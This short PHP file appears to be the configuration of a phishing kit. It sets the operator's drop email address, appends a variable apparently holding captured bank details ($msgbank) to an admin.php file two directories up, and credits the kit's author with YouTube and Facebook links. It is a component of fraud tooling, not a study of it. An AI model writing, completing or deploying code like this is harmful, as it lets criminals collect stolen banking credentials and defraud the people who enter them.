<?php

$yourmail  = 'Alvumhz2000@gmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);


$My_Name = "Alvumhz" ; 

$Name_page = "Alvumhz" ;

$channel_youtube = "https://www.youtube.com/channel/UCLnz5ZLUsHccLgXVLa5vv9w";

$My_Facebook = "facebook.com/xrabbit.phtml";


?>